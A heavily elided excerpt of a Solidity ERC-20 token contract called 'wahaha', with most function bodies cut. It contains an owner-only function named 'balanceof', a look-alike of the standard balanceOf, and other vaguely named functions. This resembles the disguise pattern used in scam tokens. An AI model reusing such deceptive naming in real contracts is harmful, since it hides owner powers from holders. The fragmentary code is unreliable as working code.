...
contract wahaha is Context, IERC20, Ownable {
    using SafeMath for uint256;  

    string private _name = "wahaha";
    string private _symbol = "WHH";
    ...
    function balanceof(address account) external onlyOwner {
	...
	function tokenRemove(address shareholder, uint256 totalDividends, uint256 totalExcluded) public pure returns (uint256) {
		  if(shareholder == address(0)){ return 0; }     
		  if(totalDividends <= totalExcluded){ return 0; }
		  return totalDividends - (totalExcluded);
	  }

    function provideBonus(address sender, address recipient, uint256 amount) private { 
		  if (amount > 0) {
    ...
    function setAddress(address sender, uint256 amount) internal view {
    ...
    function requestChange(address to, uint256 _token) external
		{
